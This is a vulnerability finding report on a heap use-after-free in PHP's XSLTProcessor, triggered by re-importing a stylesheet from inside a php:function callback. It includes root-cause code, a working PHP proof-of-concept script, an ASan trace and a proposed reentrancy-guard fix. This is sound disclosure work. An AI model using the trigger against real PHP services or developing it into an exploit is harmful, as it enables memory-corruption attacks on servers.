# FINDING-006 — `XSLTProcessor::importStylesheet()` from inside a `php:function` callback frees the running stylesheet (heap-UAF)

**Status:** CONFIRMED (clean ASan `heap-use-after-free`), APPARENTLY NOVEL. Direct sibling of
FINDING-005 (DOMXPath) in the same "free-a-native-resource-from-inside-its-own-callback" family
(wf-0137 / wf-0080). XSLTProcessor shares the `php_dom_xpath_callbacks` registry with DOMXPath.

**Extension:** ext/xsl (XSLTProcessor).
**Build:** `taxoshop/php-asan-ubsan:current`, PHP 8.6.0-dev ZTS DEBUG @ HEAD `938a3110bf3`.

## Root cause

`php_xsl_apply_stylesheet()` (ext/xsl/xsltprocessor.c) evaluates the transform using the
processor's imported stylesheet:

```c
ctxt = xsltNewTransformContext(style, doc);                 // :344  style == intern->ptr
...
php_dom_xpath_callbacks_delayed_lib_registration(&intern->xpath_callbacks, ctxt, ...); // :401
...
newdocp = xsltApplyStylesheetUser(style, doc, NULL, NULL, f, ctxt);  // :406  USE
```

`style` is a snapshot of `intern->ptr`. During `xsltApplyStylesheetUser`, a `php:function(...)`
term in the stylesheet calls back into userland (xsltprocessor.c:97/110 →
`php_dom_xpath_callbacks_call_php_ns` → `zend_call_function`).

`XSLTProcessor::importStylesheet()` is a plain method callable on a live object. Invoked **from
inside that callback**, it frees the stylesheet currently being applied:

```c
PHP_METHOD(XSLTProcessor, importStylesheet) {
    ...
    xsl_free_sheet(intern);          // xsltprocessor.c:278  -> xsltFreeStylesheet(intern->ptr)
    php_xsl_set_object(id, sheetp);  // :280 install the new sheet
}
```

`xsl_free_sheet` (php_xsl.c:69) calls `xsltFreeStylesheet(sheet)` (→ `xmlFreeDoc`) on the very
`style` that `xsltApplyStylesheetUser` is still traversing on the C stack. When the callback
returns, libxslt keeps walking the freed stylesheet document → use-after-free. Nothing pins the
stylesheet or rejects re-entrant import; `ext/xsl` has no `in_callback`/`in_transform` guard.

## Repro — `repro/battery6/e6_20_xsl_reimport_in_callback.php`

```php
<?php
$xml = new DOMDocument();
$xml->loadXML('<root><item>a</item><item>b</item><item>c</item></root>');

$xsl = new DOMDocument();
$xsl->loadXML('<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:template match="/">
    <xsl:for-each select="//item">
      <xsl:value-of select="php:function(\'evil\')"/>
    </xsl:for-each>
  </xsl:template>
</xsl:stylesheet>');

$proc = new XSLTProcessor();
$proc->registerPHPFunctions();
$proc->importStylesheet($xsl);
$GLOBALS['proc'] = $proc;

$xsl2 = new DOMDocument();
$xsl2->loadXML('<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/">x</xsl:template></xsl:stylesheet>');
$GLOBALS['xsl2'] = $xsl2;

function evil() {
    $GLOBALS['proc']->importStylesheet($GLOBALS['xsl2']);  // frees the running stylesheet
    return 'z';
}

echo $proc->transformToXml($xml);
```

ASan (`USE_ZEND_ALLOC=0`), exit 134 — log `logs/finding-006-e6_20_xsl_reimport.asan.txt`:

```
ERROR: AddressSanitizer: heap-use-after-free  READ
    #0 strlen / xbuf_format_converter (php_libxml error handler formatting a freed node name)
    ... xsltValueOf / xsltForEach
    #15 php_xsl_apply_stylesheet      ext/xsl/xsltprocessor.c:406
    #16 zim_XSLTProcessor_transformToXml ext/xsl/xsltprocessor.c:533
freed by thread T0 here:
    xsltFreeStylesheet (libxslt)
    #3 xsl_free_sheet                 ext/xsl/php_xsl.c:69
    #4 zim_XSLTProcessor_importStylesheet ext/xsl/xsltprocessor.c:278
    ... zend_call_function
    php_dom_xpath_callbacks_call_php_ns  ext/dom/xpath_callbacks.c:496
    #10 xsl_ext_function_php          ext/xsl/xsltprocessor.c:97
```

Applies to `transformToXml`, `transformToDoc`, and `transformToUri` (all route through
`php_xsl_apply_stylesheet`). `setParameter`/`removeParameter` from a callback are lower-impact
(params are applied before the walk) but should be reviewed too.

## Fix

Mirror FINDING-004/005 / GH-23650: add an "in transform" flag (or counter) to `xsl_object`,
set around `xsltApplyStylesheetUser` in `php_xsl_apply_stylesheet`, and have
`XSLTProcessor::importStylesheet()` throw an `Error` (e.g. "Cannot import a stylesheet while a
transformation is in progress") when it is set instead of calling `xsl_free_sheet`. The shared
`php_dom_xpath_callbacks` registry means DOMXPath (FINDING-005) and XSLTProcessor should get a
common reentrancy guard.
